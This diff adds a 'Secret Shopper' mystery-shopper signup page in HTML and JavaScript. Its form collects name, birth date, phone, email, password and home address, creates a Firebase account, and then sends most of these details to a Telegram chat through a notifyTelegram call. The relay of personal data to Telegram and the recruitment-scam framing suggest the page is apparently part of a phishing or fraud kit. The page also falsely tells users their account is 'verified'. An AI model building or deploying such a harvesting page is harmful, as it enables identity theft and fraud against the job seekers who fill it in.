@@ -1,0 +1,410 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>The premiere mystery shopping company. New Shopper Signup</title>
+    
+    <link rel="icon" type="image/x-icon" href="assets/favicon.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
+    <link rel="stylesheet" type="text/css" href="https://npmcdn.com/flatpickr/dist/themes/confetti.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <style>
+        :root {
+            --btn-width: 110px; 
+            --btn-height: 38px;
+            --primary-blue: #002e5b;
+            --accent-red: #a94442;
+            --accent-blue: #4484f1;
+            --accent-green: #2e7d32;
+        }
+
+        * { box-sizing: border-box; transition: all 0.2s ease-in-out; }
+        
+        body {
+            margin: 0; padding: 0;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #f1f4f8;
+            color: #333;
+        }
+
+        header {
+            background-color: var(--primary-blue); 
+            padding: 0 30px;
+            display: flex;
+            align-items: center;
+            height: 65px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-logo { height: 53px; }
+
+        .main-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 65px);
+            padding: 20px;
+        }
+
+        .signup-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 750px;
+            display: flex;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            min-height: 550px;
+        }
+
+        .image-pane {
+            flex: 1;
+            background: url('assets/her.jpeg') no-repeat center center;
+            background-size: cover;
+        }
+
+        .form-pane {
+            flex: 1.2; 
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .step-content { display: none; }
+        .step-content.active { display: flex; flex-direction: column; flex: 1; }
+
+        .form-logo { height: 50px; width: auto; margin-bottom: 20px; align-self: center; }
+
+        h2 { font-size: 23px; font-weight: 550; margin: 0 0 5px 0; color: #333; }
+        hr { border: 0; border-top: 1px solid #eee; margin-bottom: 15px; }
+
+        .row { display: flex; gap: 15px; margin-bottom: 10px; }
+        .input-group { flex: 1; position: relative; }
+        label { display: block; font-size: 13px; font-weight: 520; margin-bottom: 5px; color: #555; }
+
+        input, select {
+            width: 100%;
+            height: 38px;
+            padding: 5px 12px;
+            border: 1px solid #ccc;
+            border-left: 2px solid var(--accent-red);
+            border-radius: 6px;
+            font-size: 14px;
+            background-color: #fff;
+            outline: none;
+        }
+
+        .calendar-input {
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23999' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='3' y='4' width='18' height='18' rx='2' ry='2'%3E%3C/rect%3E%3Cline x1='16' y1='2' x2='16' y2='6'%3E%3C/line%3E%3Cline x1='8' y1='2' x2='8' y2='6'%3E%3C/line%3E%3Cline x1='3' y1='10' x2='21' y2='10'%3E%3C/line%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 18px;
+            cursor: pointer;
+        }
+
+        .no-accent { border-left: 1px solid #ccc !important; }
+        .checkbox-container { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; font-size: 13px; color: #555; cursor: pointer; }
+        .checkbox-container input { width: 18px; height: 18px; margin: 0; cursor: pointer; }
+
+        .button-container { display: flex; justify-content: space-between; margin-top: auto; padding-top: 20px; }
+        .btn {
+            min-width: var(--btn-width); height: var(--btn-height); padding: 0 15px; border-radius: 6px; font-weight: 400; cursor: pointer; border: none;
+            display: flex; align-items: center; justify-content: center; font-size: 14px; white-space: nowrap;
+        }
+        .btn:disabled { background-color: #7ca8ff !important; cursor: not-allowed; opacity: 0.7; }
+        .btn-prev { background-color: #4484f1; color: white; }
+        .btn-next { background-color: #7ca8ff; color: white; }
+        .btn-cancel { background-color: #eb3d3d; color: white; }
+
+        /* Modern Welcome Modal Styling */
+        #successModal {
+            display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; 
+            background-color: rgba(0,0,0,0.6); align-items: center; justify-content: center; backdrop-filter: blur(4px);
+        }
+        .modal-content {
+            background: white; padding: 35px 30px; border-radius: 16px; text-align: center; max-width: 450px; width: 90%; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2); animation: modalPopup 0.3s ease-in-out;
+        }
+        @keyframes modalPopup { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .success-icon {
+            width: 65px; height: 65px; background: var(--accent-green); color: white; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; font-size: 32px; margin: 0 auto 15px;
+        }
+        .welcome-badge-box {
+            background: #f8fafc; border: 1px dashed #cbd5e1; padding: 12px; border-radius: 8px; margin: 15px 0; text-align: left; font-size: 13px; color: #475569;
+        }
+        .welcome-badge-box strong { color: var(--primary-blue); }
+
+        @media (max-width: 768px) {
+            header .header-logo { visibility: hidden; opacity: 0; width: 0; } 
+            .signup-card { flex-direction: column; min-height: auto; }
+            .image-pane { display: none; }
+            .form-pane { padding: 25px 20px; }
+            .row { flex-direction: column; gap: 12px; }
+            .btn { width: 48%; min-width: unset; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <img src="assets/logo1.png" alt="Secret Shopper" class="header-logo">
+    </header>
+
+    <div class="main-wrapper">
+        <div class="signup-card">
+            <div class="image-pane"></div>
+
+            <div class="form-pane">
+                <img src="assets/logo2.png" alt="Secret Shopper" class="form-logo">
+
+                <!-- STEP 1 -->
+                <div id="step1" class="step-content active">
+                    <h2>Basic Info</h2>
+                    <hr>
+                    <div class="row">
+                        <div class="input-group"><label>First Name</label><input type="text" class="v1" id="fname"></div>
+                        <div class="input-group"><label>Last Name</label><input type="text" class="v1" id="lname"></div>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="input-group">
+                            <label>Date of Birth</label>
+                            <input type="text" id="dob" class="v1 calendar-input" placeholder="Select Date" readonly>
+                        </div>
+                        <div class="input-group">
+                            <label>Gender</label>
+                            <select class="v1" id="gender">
+                                <option value=""></option>
+                                <option>Male</option>
+                                <option>Female</option>
+                                <option>Other</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="row"><div class="input-group"><label>Phone</label><input type="tel" class="v1" id="phone" maxlength="14"></div></div>
+                    <div class="row"><div class="input-group"><label>Email Address</label><input type="email" class="v1" id="email"></div></div>
+                    <div class="row"><div class="input-group"><label>Password</label><input type="password" class="v1" id="password" placeholder="At least 6 characters"></div></div>
+                    
+                    <div class="button-container">
+                        <button class="btn btn-cancel" onclick="goToIndex()"><i class="fas fa-times"></i> &nbsp; Cancel</button>
+                        <button class="btn btn-next" id="btn-1" onclick="showStep(2)" disabled>Next &nbsp; <i class="fas fa-arrow-right"></i></button>
+                    </div>
+                </div>
+
+                <!-- STEP 2 -->
+                <div id="step2" class="step-content">
+                    <h2>Address Info</h2>
+                    <hr>
+                    <div class="row"><div class="input-group"><label>Address</label><input type="text" class="v2" id="addr"></div></div>
+                    <div class="row"><div class="input-group"><label>Address Line 2</label><input type="text" class="no-accent" id="addr2"></div></div>
+                    <div class="row">
+                        <div class="input-group"><label>City</label><input type="text" class="v2" id="city"></div>
+                        <div class="input-group"><label>State</label><select id="state-select" class="v2"><option value="">Select State</option></select></div>
+                    </div>
+                    <div class="row">
+                        <div class="input-group"><label>Zip</label><input type="text" class="v2" id="zip" maxlength="5"></div>
+                        <div class="input-group"><label>Country</label><select id="country-select"></select></div>
+                    </div>
+
+                    <div class="button-container">
+                        <button class="btn btn-prev" onclick="showStep(1)"><i class="fas fa-arrow-left"></i> &nbsp; Previous</button>
+                        <button class="btn btn-next" id="btn-2" onclick="showStep(3)" disabled>Next &nbsp; <i class="fas fa-arrow-right"></i></button>
+                    </div>
+                </div>
+
+                <!-- STEP 3 -->
+                <div id="step3" class="step-content">
+                    <h2>Additional Info</h2>
+                    <hr>
+                    <div class="row">
+                        <div class="input-group">
+                            <label>How did you hear about us?</label>
+                            <select class="v3" id="source">
+                                <option value="">Select</option>
+                                <option>Social Media</option>
+                                <option>Friend/Referral</option>
+                                <option>Online Search</option>
+                                <option>Job Board</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div style="margin-top: 15px;">
+                        <label class="checkbox-container">
+                            <input type="checkbox" checked>
+                            <span>I would like to receive emails about shops in my area.</span>
+                        </label>
+                    </div>
+
+                    <div class="button-container">
+                        <button class="btn btn-prev" onclick="showStep(2)"><i class="fas fa-arrow-left"></i> &nbsp; Previous</button>
+                        <button class="btn btn-next" id="btn-3" onclick="handleFinish()" disabled>Finish &nbsp; <i class="fas fa-arrow-right"></i></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Interactive Welcome & Success Modal -->
+    <div id="successModal">
+        <div class="modal-content">
+            <div class="success-icon"><i class="fas fa-check"></i></div>
+            <h2 style="margin-bottom: 5px;">Welcome to Secret Shopper!</h2>
+            <p style="color: #64748b; font-size: 13px; margin-bottom: 10px;">
+                Your operative account has been successfully created and verified.
+            </p>
+            
+            <div class="welcome-badge-box">
+                <div><strong>Registered Email:</strong> <span id="modal-user-email">...</span></div>
+                <div style="margin-top: 4px;"><strong>Shopper UID:</strong> <code id="modal-user-uid" style="color:#d97706;">...</code></div>
+            </div>
+
+            <p style="color: #475569; font-size: 13px; margin-bottom: 20px;">
+                You can now log in securely using either your email address or your unique User ID.
+            </p>
+
+            <button onclick="window.location.href='index.html'" class="btn btn-next" style="width: 100%; height: 42px; font-size: 14px; background-color: var(--primary-blue); justify-content: center;">
+                <i class="fas fa-sign-in-alt"></i> &nbsp; Proceed to Secure Login
+            </button>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+    <script src="config.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+
+    <script>
+        flatpickr("#dob", {
+            dateFormat: "m/d/Y",
+            maxDate: "today",
+            disableMobile: "true",
+            altInput: true,
+            altFormat: "F j, Y"
+        });
+
+        function showStep(stepNumber) {
+            document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + stepNumber).classList.add('active');
+            window.scrollTo(0,0);
+        }
+
+        function goToIndex() { window.location.href = 'index.html'; }
+
+        async function handleFinish() {
+            const btn = document.getElementById('btn-3');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+            btn.disabled = true;
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const firstName = document.getElementById('fname').value.trim();
+            const lastName = document.getElementById('lname').value.trim();
+            const fullName = `${firstName} ${lastName}`;
+            const gender = document.getElementById('gender').value;
+            const phone = document.getElementById('phone').value.trim();
+            const dob = document.getElementById('dob').value;
+            
+            const addr = document.getElementById('addr').value.trim();
+            const addr2 = document.getElementById('addr2').value.trim();
+            const city = document.getElementById('city').value.trim();
+            const state = document.getElementById('state-select').value;
+            const zip = document.getElementById('zip').value.trim();
+            const country = document.getElementById('country-select').value;
+            const source = document.getElementById('source').value;
+
+            try {
+                const userCred = await auth.createUserWithEmailAndPassword(email, password);
+                const uid = userCred.user.uid;
+
+                await db.collection("users").doc(uid).set({
+                    uid: uid,
+                    name: fullName,
+                    email: email,
+                    phone: phone,
+                    dob: dob,
+                    gender: gender,
+                    address: addr,
+                    address2: addr2,
+                    city: city,
+                    state: state,
+                    zip: zip,
+                    country: country,
+                    source: source,
+                    tasks: [], 
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+
+                const telegramMessage = `🚀 *New Shopper Registered*\n\n` +
+                                        `👤 *Name:* ${fullName}\n` +
+                                        `📧 *Email:* ${email}\n` +
+                                        `📞 *Phone:* ${phone}\n` +
+                                        `🎂 *DOB:* ${dob} | *Gender:* ${gender}\n` +
+                                        `🏠 *Address:* ${addr} ${addr2 ? '('+addr2+')': ''}\n` +
+                                        `📍 *Location:* ${city}, ${state} ${zip}, ${country}\n` +
+                                        `🔍 *Source:* ${source}\n` +
+                                        `🔑 *UID:* \`${uid}\``;
+
+                notifyTelegram(telegramMessage);
+
+                // Populate dynamic modal info elements before display
+                document.getElementById('modal-user-email').innerText = email;
+                document.getElementById('modal-user-uid').innerText = uid;
+
+                // Open the welcome modal overlay
+                document.getElementById('successModal').style.display = 'flex';
+
+            } catch (error) {
+                console.error("Error:", error);
+                alert("Registration failed: " + error.message);
+                btn.innerHTML = 'Finish &nbsp; <i class="fas fa-arrow-right"></i>';
+                btn.disabled = false;
+            }
+        }
+
+        function setupValidation(inputClass, buttonId) {
+            const inputs = document.querySelectorAll('.' + inputClass);
+            const btn = document.getElementById(buttonId);
+            const validate = () => {
+                let complete = true;
+                inputs.forEach(i => { if (!i.value.trim()) complete = false; });
+                btn.disabled = !complete;
+            };
+            inputs.forEach(i => {
+                i.addEventListener('input', validate);
+                i.addEventListener('change', validate);
+            });
+        }
+
+        setupValidation('v1', 'btn-1');
+        setupValidation('v2', 'btn-2');
+        setupValidation('v3', 'btn-3');
+
+        document.getElementById('phone').addEventListener('input', (e) => {
+            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
+            e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
+        });
+
+        const states = ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"];
+        const sSel = document.getElementById('state-select');
+        states.forEach(s => { let o = document.createElement('option'); o.value = s; o.innerText = s; sSel.appendChild(o); });
+
+        const countries = ["United States", "United Kingdom", "Canada", "Australia", "New Zealand"];
+        const cSel = document.getElementById('country-select');
+        countries.forEach(c => { 
+            let o = document.createElement('option'); o.value = c; o.innerText = c; 
+            if(c === "United States") o.selected = true;
+            cSel.appendChild(o); 
+        });
+    </script>
+</body>
+</html>
